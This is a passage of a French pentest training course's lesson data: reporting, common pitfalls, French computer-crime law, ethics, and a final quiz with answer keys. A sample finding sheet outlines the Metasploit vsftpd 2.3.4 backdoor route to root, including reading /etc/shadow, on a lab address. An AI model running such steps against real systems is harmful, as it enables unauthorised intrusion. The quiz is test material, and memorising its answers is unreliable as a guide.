              "Prévention : empêcher l'attaque (mises à jour, durcissement, pare-feu, principes du moindre privilège).",
              "Détection : voir l'attaque en cours (journaux, SIEM, alertes, surveillance).",
              "Réponse : réagir et limiter l'impact (plan d'incident, isolation, sauvegardes, contacts)."
            ),
            h("Le durcissement de base"),
            list(
              "Mettre à jour les systèmes et appliquer les correctifs de sécurité.",
              "Supprimer ou désactiver les services et comptes inutiles.",
              "Changer les mots de passe par défaut et appliquer une politique de mots de passe robuste.",
              "Limiter les droits : moindre privilège, comptes séparés par rôle.",
              "Équilibrer la surface exposée : ne publier que ce qui doit l'être."
            ),
            h("Réduire la surface d'attaque"),
            p(
              "Chaque port ouvert est une porte potentielle. Un pare-feu bien réglé ferme ce qui ne doit pas être exposé. Exemple sur un serveur qui n'a besoin que du web :"
            ),
            code(
              `sudo ufw enable\nsudo ufw allow 22/tcp\nsudo ufw allow 80,443/tcp\nsudo ufw status`
            ),
            h("Le rôle du pentester"),
            p(
              "Le pentester n'est pas là pour remplacer l'administrateur, mais pour fournir les preuves et les priorités qui permettent de décider. Une recommandation est bonne quand elle est actionnable : la commande, le réglage ou la version à appliquer."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Le score CVSS note la gravité technique ; la matrice de risque classe la priorité métier.",
              "Contre-mesures : prévenir, détecter, répondre.",
              "Une recommandation sans action concrète ne vaut rien."
            ),
            callout(
              "Dans le rapport, chaque constat se termine par sa recommandation : la correction, sa priorité, et le niveau de risque restant après correction.",
              "info"
            ),
            callout(
              "Durcir un système se teste aussi : après correction, le re-test vérifie que la faille est réellement fermée, pas seulement déclarée fermée.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-23",
          title: "Le rapport de pentest : structure et preuves",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("Le produit final"),
            p(
              "Le rapport est l'unique livrable qui reste au client. C'est lui que relisent la direction, l'assureur, l'auditeur et les équipes techniques. S'il est incomplet ou sans preuves, le travail d'exploitation perd toute valeur. Il se compose de deux documents : le rapport exécutif et le rapport technique."
            ),
            h("L'analogie de l'ordonnance"),
            p(
              "L'exploitation, c'est l'examen médical ; le rapport, c'est l'ordonnance. Un médecin qui découvre une maladie mais ne donne pas d'ordonnance lisible ne soigne personne. Le rapport doit permettre au client de se soigner, tout seul, sans le médecin."
            ),
            h("Le rapport exécutif"),
            p(
              "Destiné à la direction : non technique, court (2 à 3 pages). Il résume ce qui a été testé, les risques majeurs, le nombre de vulnérabilités par gravité, et les trois priorités d'action."
            ),
            h("La structure du rapport technique"),
            list(
              "1. Synthèse exécutive : le résumé non technique, les priorités.",
              "2. Portée et méthodologie : actifs testés, RoE, référentiels utilisés (PTES...).",
              "3. Synthèse des constats : tableau avec ID, titre, gravité CVSS, nombre par niveau.",
              "4. Constats détaillés : une fiche par vulnérabilité.",
              "5. Recommandations : corrections priorisées (court, moyen, long terme).",
              "6. Annexes : inventaire des actifs, outils, chronologie, captures brutes, POC."
            ),
            h("Ce qu'est une bonne preuve"),
            list(
              "Reproductible : les commandes exactes sont fournies.",
              "Horodatée : captures avec date et heure.",
              "Vérifiable : sortie de id, whoami, nmap, écran de hydra...",
              "Minimale : assez pour prouver, sans copier de données sensibles réelles.",
              "Croisée : deux preuves valent mieux qu'une (sortie + capture)."
            ),
            h("La fiche de constat"),
            code(
              `V-01 — Backdoor vsftpd 2.3.4 — accès root\nGravité : 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nActif   : serveur-app (192.168.56.10)\nPreuve  : msfconsole → exploit/unix/ftp/vsftpd_234_backdoor → run → id → uid=0(root)\nImpact  : contrôle total du serveur, lecture de /etc/shadow\nRemédiation : mettre à jour vsftpd, fermer le port, appliquer les correctifs`
            ),
            h("Le tableau de synthèse"),
            code(
              `ID    Titre                                  CVSS   Niveau\nV-01  Backdoor vsftpd — accès root            9.8    Critical\nV-02  Injection SQL sur /product.php          9.1    Critical\nV-03  Révélation de la version du serveur     5.3    Medium\nV-04  Cookies de session sans Secure          5.3    Medium`
            ),
            h("Les bonnes pratiques"),
            list(
              "Écrire le rapport au fil de l'eau, pas à la fin.",
              "Une structure identique pour chaque constat : lecture rapide.",
              "Ne pas exagérer la gravité, ne pas fabriquer de preuves.",
              "Faire relire par un pair avant d'envoyer au client."
            ),
            callout(
              "Les preuves se collectent pendant le test, pas après. Un rapport reconstitué de mémoire est un rapport contestable.",
              "tip"
            ),
            callout(
              "Ne jamais coller dans le rapport des données sensibles réelles (mots de passe en clair, extraits de bases clients). On prouve l'impact avec des données de test et des preuves minimales.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-24",
          title: "Les pièges à éviter",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Ce qui transforme une mission en crise"),
            p(
              "Chaque piège ci-dessous est une vraie erreur de terrain, observée dans des engagements réels. Les éviter fait la différence entre un pentester professionnel et un apprenti dangereux."
            ),
            h("Piège n°1 : tester sans autorisation"),
            p(
              "On veut « essayer » sur une cible réelle, parfois pour rigoler. La loi punit l'intrusion sans autorisation (article 323-1 du code pénal). Règle d'or : jamais une commande offensive sur un système tiers sans contrat, scope et autorisation signés."
            ),
            h("Piège n°2 : sortir du scope"),
            p(
              "On suit une piste et on déborde vers une machine hors périmètre. On relit le scope avant chaque phase, on documente toute découverte hors périmètre sans l'exploiter, et on demande une extension écrite si la piste vaut le coup."
            ),
            h("Piège n°3 : casser le système du client"),
            p(
              "Un exploit de noyau mal choisi, un bruteforce trop agressif qui verrouille des comptes, des requêtes destructrices. On respecte les RoE, on teste les exploits en labo d'abord, on privilégie les POC minimaux, et si un système tombe, on le signale immédiatement."
            ),
            h("Piège n°4 : ne rien documenter"),
            p(
              "On est « dans le flow » et on oublie de noter. On tient un fichier de notes horodaté par phase, on sauvegarde les sorties avec tee, on capture systématiquement. Le rapport s'écrit au fur et à mesure, pas de mémoire."
            ),
            h("Piège n°5 : oublier -p- sur nmap"),
            p(
              "Par défaut, nmap ne teste que 1000 ports. On croit gagner du temps. Toujours -p- puis -sV sur les ports ouverts : le service qui manque est souvent celui qu'un attaquant viserait en premier."
            ),
            h("Piège n°6 : croire un scanner à 100 %"),
            p(
              "Un scanner automatique produit des faux positifs. On confirme chaque alerte à la main, et on ne reporte que les constats confirmés, en marquant le reste « à vérifier »."
            ),
            h("Piège n°7 : bruteforce sans réfléchir"),
            p(
              "hydra avec 50 tâches sur un service de production, c'est la recette du verrouillage de comptes. RoE d'abord, -t modéré, -f pour s'arrêter, et connaître la tolérance du service."
            ),
            h("Piège n°8 : toucher aux données réelles"),
            p(
              "On lit un fichier client ou une base pour « prouver » l'impact. Preuve minimale avec des données de test ; si l'impact exige un accès à des données sensibles, on le signale et on demande l'autorisation explicite."
            ),
            h("Piège n°9 : oublier le nettoyage"),
            p(
              "On laisse des fichiers de transfert, des shells, des crons modifiés. En fin de post-exploitation, on liste et supprime ce qu'on a déposé, et on vérifie que les services tournent comme avant."
            ),
            h("Le fil rouge"),
            list(
              "Autorisation avant tout, discipline pendant, propreté après.",
              "Documenter chaque action : commande, sortie, capture.",
              "Confirmer avant de conclure : un port ouvert n'est pas une faille.",
              "Ne jamais laisser le lab devenir une cible : isolation et discrétion."
            ),
            callout(
              "Le premier piège est une question de loi, les autres de méthode. Un seul suffit à transformer un engagement en incident — ou en délit.",
              "danger"
            ),
            callout(
              "S'entraîner sur son lab permet de tomber dans tous ces pièges sans conséquence. C'est exactement pour ça que le lab existe.",
              "tip"
            )
          ]
        },
        {
          id: "ptm-lecon-25",
          title: "L'après-pentest : re-test, restitution et clôture",
          type: "theory",
          duration: "11 min",
          blocks: [
            h("Le travail continue après le rapport"),
            p(
              "L'engagement ne s'arrête pas à l'envoi du rapport. La restitution, le re-test et la clôture font partie intégrante de la mission, et souvent du contrat."
            ),
            h("La restitution"),
            p(
              "On présente les résultats au client, en direct : les constats majeurs, les preuves, les priorités. C'est le moment où la direction comprend le « pourquoi » des corrections. On répète sa présentation : un pentester qui bredouille ses propres preuves perd toute crédibilité."
            ),
            h("Le re-test"),
            p(
              "Après les corrections du client, on revient vérifier que chaque vulnérabilité est réellement fermée. Le re-test est ciblé : on rejoue le POC de chaque constat corrigé, on confirme que rien ne répond plus, et on met à jour le rapport."
            ),
            code(
              `nmap -sV -p 21,22,80 192.168.56.10\nsearchsploit vsftpd 2.3.4\n# si le service est mis à jour ou fermé : constat résolu`
            ),
            h("La clôture du dossier"),
            list(
              "Rapport final mis à jour avec les résultats du re-test.",
              "Synthèse des constats résolus, partiellement résolus, non résolus.",
              "Archivage des preuves et des notes de l'engagement.",
              "Suppression des accès temporaires et des fichiers déposés.",
              "Facturation et clôture administrative."
            ),
            h("L'archivage des preuves"),
            p(
              "On conserve les captures, les sorties et les notes dans un dossier sécurisé, pour une durée définie par le contrat. Si le client conteste un constat dans trois mois, on doit pouvoir le rejouer."
            ),
            h("Les limites du test"),
            p(
              "Le rapport doit aussi dire ce qui n'a pas été testé : plages non accessibles depuis le point d'entrée, environnements exclus, techniques interdites par les RoE. C'est ce qui rend le rapport honnête et défendable."
            ),
            h("La déontologie du métier"),
            list(
              "Reste discret : ce que tu as vu chez un client ne se raconte pas.",
              "Ne publie jamais d'exploit ni de donnée client.",
              "Tiens à jour ta méthode : les systèmes évoluent, les CVE aussi.",
              "Garde ton profil propre : l'intégrité est une compétence."
            ),
            callout(
              "Un pentest bien clos, c'est un client qui sait ce qu'il doit faire, des preuves archivées, et un re-test qui valide les corrections. C'est la boucle complète du PTES.",
              "info"
            ),
            callout(
              "Le re-test ne concerne que les corrections annoncées : il ne recrée pas l'engagement complet sans nouveau contrat. Toute reprise de test élargie doit être recadrée.",
              "warning"
            )
          ]
        },
      ],
    },
    {
      id: "ptm-module-5",
      title: "Cadre légal, éthique et transition",
      lessons: [
        {
          id: "ptm-lecon-26",
          title: "Le cadre légal de l'intrusion",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("La frontière avec la loi"),
            p(
              "Le pentester autorisé travaille à la frontière exacte entre le légal et l'illégal. La différence ne tient pas à la technique, mais au cadre : l'autorisation. Toute intrusion non autorisée est un délit pénal en France, quelle que soit la compétence de son auteur."
            ),
            h("L'article 323-1 du code pénal"),
            p(
              "Ce texte punit l'accès frauduleux à un système de traitement automatisé de données (STAD). La simple tentative est aussi punie : « scanner pour voir » relève déjà de la tentative d'accès frauduleux."
            ),
            code(
              `Art. 323-1 — Le fait d'accéder ou de se maintenir, frauduleusement,\ndans tout ou partie d'un système de traitement automatisé de données\nest puni de trois ans d'emprisonnement et de 100 000 € d'amende.`
            ),
            h("Les textes voisins"),
            list(
              "323-2 : entrave au fonctionnement d'un STAD (cinq ans, 150 000 €).",
              "323-3 : introduction, suppression ou modification de données (cinq ans, 150 000 €).",
              "323-3-1 : extorsion de données (sept ans, 300 000 €).",
              "323-4 : bande organisée, peines aggravées (sept ans).",
              "323-7 : la tentative d'un de ces délits est punie comme le délit lui-même."
            ),
            h("L'écart qui change tout : l'autorisation"),
            p(
              "Les mêmes commandes qui constituent un délit deviennent légales dans le cadre d'un engagement signé. Ce qui fait la différence, ce sont : l'écrit, le scope, la durée, les techniques autorisées — et la preuve de tout ça, conservée."
            ),
            h("Les conditions d'une autorisation solide"),
            list(
              "Un contrat ou un document d'autorisation signé avant le début des tests.",
              "La définition précise du périmètre (IP, plages, applications, domaines).",
              "La période de validité de l'autorisation.",
              "Les techniques autorisées et interdites, les horaires, les contacts.",
              "La conservation de l'autorisation avec les preuves de l'engagement."
            ),
            h("La tentative est déjà punie"),
            p(
              "La justice française ne demande pas la preuve que l'attaque a réussi : la tentative suffit. Un scan non autorisé peut déjà constituer un commencement d'exécution. L'ignorance de la technique ou de la loi n'est pas une excuse."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Accès, entrave, modification de données : trois familles de délits avec des peines progressives.",
              "La tentative est punie comme l'infraction.",
              "L'autorisation écrite et précise est la seule frontière légale."
            ),
            callout(
              "Prends soin de tes autorisations comme de ton outil le plus précieux : range-les, archive-les, sache les retrouver des années après un engagement.",
              "tip"
            ),
            callout(
              "La violation de données personnelles aggrave la situation : la CNIL et le RGPD s'ajoutent au code pénal. Une fuite non maîtrisée peut coûter jusqu'à 4 % du chiffre d'affaires mondial.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-27",
          title: "Le cadre légal du hacktiviste",
          type: "theory",
          duration: "10 min",
          blocks: [
            h("L'illusion des bonnes intentions"),
            p(
              "Certains s'imaginent que pirater une organisation qui fait « mal » est excusable, voire héroïque. C'est faux : la loi ne distingue pas selon les motifs. Une intrusion reste une intrusion, quelle que soit la cause qu'on prétend défendre."
            ),
            h("Ce que la loi ignore"),
            list(
              "Les bonnes intentions n'exonèrent pas : la finalité ne figure pas dans les éléments constitutifs du délit.",
              "La cible « méritante » n'existe pas juridiquement : l'autorisation, elle, existe.",
              "La divulgation de données volées est un délit supplémentaire, même « pour alerter ».",
              "L'anonymat technique ne protège pas de la qualification pénale."
            ),
            h("Les trois dérives types"),
            p(
              "Première dérive : la revanche personnelle — un comptable qui efface ses notes de frais refusées. Deuxième : l'activisme — une action contre une entreprise jugée responsable d'un scandale. Troisième : l'excuse pédagogique — « je voulais juste montrer la faille » sans autorisation. Aucune de ces trois motivations n'est une défense."
            ),
            h("La frontière avec les acteurs légitimes"),
            p(
              "Les mêmes compétences sont exercées légalement par : les pentesters autorisés, les équipes de sécurité interne, les chercheurs en bug bounty sur des périmètres et règles précis, les CERT/CSIRT. La différence tient toujours au cadre écrit et à la relation de confiance."
            ),
            h("Le bug bounty, une voie légale"),
            list(
              "Des plateformes publient des programmes de chasse aux bugs : périmètre précis, règles de test, récompenses.",
              "Chaque programme définit ce qui est autorisé et ce qui est interdit.",
              "Y respecter les règles donne les mêmes satisfactions, sans risque pénal.",
              "À défaut d'autorisation, un programme bug bounty est la porte légale."
            ),
            h("Le témoignage des failles découvertes"),
            p(
              "Tu tombes par hasard sur une faille réelle (sans y avoir accédé) ? La bonne pratique : la signaler au propriétaire, par une filière officielle (coordonnées de sécurité, équipe IT), sans exploiter ni divulguer. La divulgation se prépare, avec les responsables, jamais à chaud."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Motifs et résultats ne changent pas la qualification pénale.",
              "Les bonnes pratiques offrent des voies légales : bug bounty, signalement responsable, pentest.",
              "L'autorisation reste la seule frontière."
            ),
            callout(
              "Si une cause te semble juste, le bug bounty et le signalement responsable restent les seuls chemins qui la servent sans te mettre en danger.",
              "info"
            ),
            callout(
              "S'auto-proclamer justicier numérique expose à des peines plus lourdes que la cible visée, sans jamais garantir la justice souhaitée.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-28",
          title: "L'éthique du pentester",
          type: "theory",
          duration: "10 min",
          blocks: [
            h("La confiance, première compétence"),
            p(
              "Un pentester reçoit des accès, voit des données, connaît les failles d'une organisation. Cette position repose sur la confiance du client. La perdre, c'est perdre le métier. L'éthique est donc une compétence métier, pas une option morale."
            ),
            h("Le secret professionnel"),
            list(
              "Ce que tu vois chez un client ne se raconte pas : ni aux collègues hors équipe, ni sur les réseaux sociaux, ni dans un article.",
              "Les détails techniques sensibles ne se partagent que dans le cadre de l'engagement.",
              "La discrétion dure après la fin du contrat : les informations restent protégées."
            ),
            h("Les données personnelles"),
            p(
              "Les données que tu croises (comptes, bases clients, fichiers RH) sont protégées par le RGPD et la CNIL. On ne les copie pas, on ne les utilise pas, on ne les dévoile pas. Si une preuve exige des données réelles, on en minimise l'usage et on demande une autorisation."
            ),
            h("La preuve honnête"),
            list(
              "Ne jamais gonfler la gravité d'un constat pour justifier son tarif.",
              "Ne jamais affirmer ce qu'on n'a pas confirmé : un scanner ne suffit pas.",
              "Signaler les limites du test (ce qui n'a pas été couvert).",
              "Distinguer constats confirmés, hypothèses et faux positifs."
            ),
            h("Les conflits d'intérêts"),
            p(
              "Si ton employeur est aussi le prestataire de maintenance du client, tes recommandations peuvent servir ses intérêts commerciaux. On déclare ces situations, on reste neutre dans l'analyse, et on le signale dans le rapport si besoin."
            ),
            h("Le devoir d'information"),
            list(
              "Découvrir une faille critique en dehors du scope ? On la signale, on ne l'exploite pas.",
              "Le client doit savoir les risques résiduels que les corrections ne couvrent pas.",
              "Les limites de ton niveau doivent être avouées : on ne simule pas une compétence qu'on n'a pas."
            ),
            h("L'exemple à suivre"),
            p(
              "Les organismes de référence publient leurs règles de conduite : EC-Council, Offensive Security, ISC2 pour les fondations éthiques. Les certifications les plus sérieuses (OSCP, CEH) incluent une composante d'éthique dans leurs examens."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Le secret, l'honnêteté des preuves et la neutralité des recommandations sont non négociables.",
              "Les données personnelles croisées en mission restent protégées.",
              "L'éthique se prouve en actes, pas en discours."
            ),
            callout(
              "La règle à retenir : le rapport doit être vrai, utile et non nuisible. Vrai sur les preuves, utile pour les décisions, non nuisible pour l'image et les intérêts du client.",
              "tip"
            ),
            callout(
              "Une capture d'écran de données clients, même floutée, reste une donnée personnelle manipulée sans autorisation. On s'y entraîne : preuve minimale, données de test.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-29",
          title: "Le pentester dans l'équipe de sécurité",
          type: "theory",
          duration: "10 min",
          blocks: [
            h("Un acteur parmi d'autres"),
            p(
              "Le pentester ne travaille pas seul : il s'intègre dans une équipe de sécurité qui inclut SOC, analyse, ingénierie défensive, gouvernance et direction. Sa valeur vient autant de ses conclusions que de sa capacité à les faire comprendre et intégrer."
            ),
            h("Les échanges avec le SOC"),
            list(
              "Le pentest simule une attaque ; le SOC doit pouvoir la détecter dans ses journaux.",
              "Le pentester partage ses traces (adresses, techniques, horaires) pour enrichir les règles de détection.",
              "Un bon test se coordonne pour éviter les fausses alertes : le SOC sait quand l'offensif tourne.",
              "Les règles de détection validées par un pentest réel valent mieux que des scénarios théoriques."
            ),
            h("La passerelle avec l'ingénierie défensive"),
            p(
              "L'ingénieur défensif déploie des mesures de durcissement, de supervision et de contrôle. Le pentester confronte ces mesures à la réalité de l'attaque : ce qui résiste, ce qui se contourne, ce qui manque."
            ),
            h("La direction et la gouvernance"),
            p(
              "La direction doit comprendre les risques et allouer les budgets. Le pentester traduit une faille technique en impact métier (perte de données, interruption, réputation, amendes). C'est le pont entre le technique et la stratégie."
            ),
            h("La relation avec l'équipe technique du client"),
            list(
              "Le rapport doit être actionnable : une correction par constat, expliquée et hiérarchisée.",
              "Le pentester reste disponible pendant la phase de remédiation, pour clarifier.",
              "Un ton de partenaire, jamais de juge : les équipes corrigent ce qu'on a trouvé."
            ),
            h("Les qualités transverses du métier"),
            list(
              "Communication : expliquer en clair une faille complexe à un non-technique.",
              "Rédaction : structurer des preuves lisibles et utiles.",
              "Rigueur : ne rien affirmer sans vérification.",
              "Humilité : le pentest est un instantané, pas la preuve de l'absence de faille.",
              "Curiosité : les techniques évoluent, les systèmes aussi."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Le pentest prend son sens quand ses résultats nourrissent la défense.",
              "Le SOC, l'ingénierie, la direction : chaque destinataire a besoin d'un format adapté.",
              "La coopération vaut mieux que la démonstration de force."
            ),
            callout(
              "Un pentest utile est un pentest qui fait évoluer les détections, durcit les systèmes et éclaire les décisions de la direction. C'est un travail d'équipe.",
              "tip"
            ),
            callout(
              "Un rapport plein de vulnérabilités mais sans remédiation actionnable n'apporte rien à l'équipe qui devra corriger. Pense à ceux qui vont te lire, pas à toi.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-30",
          title: "Validation du niveau 6 — cap sur le CTF",
          type: "quiz",
          duration: "10 min",
          blocks: [
            h("La dernière étape"),
            p(
              "Dernière étape avant le niveau suivant. Tu dois obtenir au moins 80 % de bonnes réponses pour valider ce niveau et gagner tes 1500 XP."
            ),
            h("Le pont vers le niveau 7"),
            p(
              "Tu as maintenant la méthode complète : cadre, recon, scan, énumération, analyse, exploitation, post-exploitation, nettoyage et reporting. Le niveau 7 va te faire tout appliquer dans un cadre différent : les CTF, ces machines vulnérables pensées comme des jeux de résolution. Là, tu ne liras plus la marche à suivre : tu la construiras."
            ),
            list(
              "Les techniques de ce niveau (nmap, gobuster, searchsploit, hydra, Metasploit) sont la boîte à outils des CTF.",
              "La méthode PTES devient ton fil conducteur quand il n'y a plus de guide.",
              "La discipline (documenter, rester dans le cadre, nettoyer) te suivra dans chaque défi.",
              "Le niveau 7 te fera chercher la première vulnérabilité par toi-même."
            ),
            callout(
              "Relis les leçons qui te semblent floues avant de répondre : tout ce qui est demandé a été vu dans ce niveau.",
              "info"
            ),
          ],
          quiz: [
            {
              question: "Que signifie le sigle PTES ?",
              options: [
                "Penetration Testing Execution Standard",
                "Professional Testing Environment Standard",
                "Practical Tool for Exploit Scanning",
                "Penetration Test for Extra Security",
              ],
              answer: 0,
              explanation:
                "PTES désigne la norme de déroulement des tests d'intrusion, de la pré-engagement à la post-exploitation.",
            },
            {
              question: "Quelle est la première phase du PTES ?",
              options: [
                "L'exploitation",
                "Les interactions et la pré-engagement",
                "L'analyse des vulnérabilités",
                "Le reporting",
              ],
              answer: 1,
              explanation:
                "Tout commence par les interactions préalables : le contrat, le périmètre et les règles d'engagement.",
            },
            {
              question: "Quel scan nmap teste les 65 535 ports TCP ?",
              options: [
                "nmap -F 192.168.56.10",
                "nmap -sn 192.168.56.10",
                "nmap -sS -p- 192.168.56.10",
                "nmap -sV 192.168.56.10",
              ],
              answer: 2,
              explanation:
                "-p- scanne la plage complète. Par défaut, nmap ne couvre que les 1000 ports les plus courants.",
            },
            {
              question: "Quel outil énumère les répertoires web cachés ?",
              options: ["hydra", "gobuster", "nmap", "john"],
              answer: 1,
              explanation:
                "gobuster (comme ffuf) brute-force les chemins web à partir d'une wordlist.",
            },
            {
              question: "Quel outil lance un brute-force de mots de passe ?",
              options: ["hydra", "searchsploit", "nmap", "nikto"],
              answer: 0,
              explanation:
                "hydra teste des combinaisons identifiants/mots de passe sur les services (ssh, http, ftp...).",
            },
            {
              question: "Que fournit la commande searchsploit ?",
              options: [
                "Les ports ouverts d'une cible",
                "Les exploits publics correspondant à un logiciel et sa version",
                "Les répertoires cachés d'un site",
                "Les mots de passe faibles d'un serveur",
              ],
              answer: 1,
              explanation:
                "searchsploit cherche dans l'Exploit Database les exploits connus pour un logiciel et une version donnés.",
            },
            {
              question: "Qu'est-ce que le score CVSS ?",
              options: [
                "Une évaluation chiffrée de la gravité d'une vulnérabilité",
                "Un outil de scan de vulnérabilités",
                "Une méthode d'exploitation",
                "Un type de pare-feu",
              ],
              answer: 0,
              explanation:
                "Le CVSS chiffre la gravité d'une faille sur une échelle de 0 à 10, sans juger le contexte métier.",
            },
            {
              question: "Lequel de ces textes punit l'accès frauduleux à un système ?",
              options: [
                "L'article 323-1 du code pénal",
                "L'article 225-1 du code civil",
                "L'article 40-1 du code du travail",
                "L'article 111-5 du code de la route",
              ],
              answer: 0,
              explanation:
                "L'article 323-1 punit l'accès ou le maintien frauduleux dans un STAD, y compris en cas de simple tentative.",
            },
            {
              question: "Qu'est-ce qui rend une intrusion légale lors d'un pentest ?",
              options: [
                "La qualité de l'exploit utilisé",
                "L'autorisation écrite, précise et préalable du propriétaire",
                "Le fait de ne rien endommager",
                "La découverte d'une faille réelle",
              ],
              answer: 1,
              explanation:
                "Seule l'autorisation contractuelle (scope, période, techniques) protège le testeur. Les bonnes intentions ne sont pas une autorisation.",
            },
            {
              question: "Dans un rapport de pentest, une bonne preuve est :",
              options: [
                "Un simple extrait de la sortie d'un scanner automatique",
                "Reproductible, horodatée et vérifiable avec les commandes exactes",
                "Une capture floutée des données clients",
                "Une liste des vulnérabilités supposées",
              ],
              answer: 1,
              explanation:
                "La preuve doit permettre de rejouer le constat : commandes exactes, sortie brute, horodatage.",
            },
            {
              question: "Que signifie la règle du moindre privilège ?",
              options: [
                "Donner à chacun uniquement les droits nécessaires à sa tâche",
                "Ne donner de droits à personne",
                "Donner tous les droits à l'administrateur",
                "Supprimer tous les comptes utilisateurs",
              ],
              answer: 0,
              explanation:
                "Le moindre privilège limite l'impact d'un compromis : un compte cassé ne donne accès qu'à ce qu'il doit faire.",
            },
            {
              question: "Où est-il légal d'exécuter des exploits sans autorisation ?",
              options: [
                "Sur n'importe quelle machine du Wi-Fi",
                "Uniquement sur son propre lab isolé (type Metasploitable en host-only)",
                "Sur les serveurs d'une entreprise si on trouve une faille",
                "Nulle part, même en labo",
              ],
              answer: 1,
              explanation:
                "Le lab isolé (réseau host-only) est le terrain d'entraînement légal. Toute cible extérieure exige une autorisation écrite.",
            },
          ],
        },
      ],
    },
  ],
};
